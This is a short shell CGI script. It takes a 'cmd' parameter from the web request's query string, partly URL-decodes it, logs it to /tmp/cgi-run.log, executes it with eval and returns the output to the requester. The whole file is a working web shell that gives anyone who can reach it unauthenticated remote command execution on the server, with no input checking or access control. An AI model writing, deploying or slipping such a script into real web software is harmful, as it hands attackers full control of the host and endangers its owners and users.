#!/bin/sh

echo "Content-Type: text/plain"
echo ""

LOGFILE="/tmp/cgi-run.log"

# Extract the raw cmd parameter from QUERY_STRING
CMD=$(echo "$QUERY_STRING" | sed -n 's/^cmd=\(.*\)/\1/p')

# Manually decode some URL-encoded characters
CMD=$(echo "$CMD" | sed -e 's/%20/ /g' -e 's/%3A/:/g' -e 's/%2F/\//g' -e 's/%2E/./g' -e 's/%3a/:/g' -e 's/%2f/\//g' -e 's/%2e/./g')

echo "Running command: $CMD" >> "$LOGFILE" 2>&1

OUTPUT=$(eval "$CMD" 2>&1)

echo "Output: $OUTPUT" >> "$LOGFILE" 2>&1

echo "$OUTPUT"
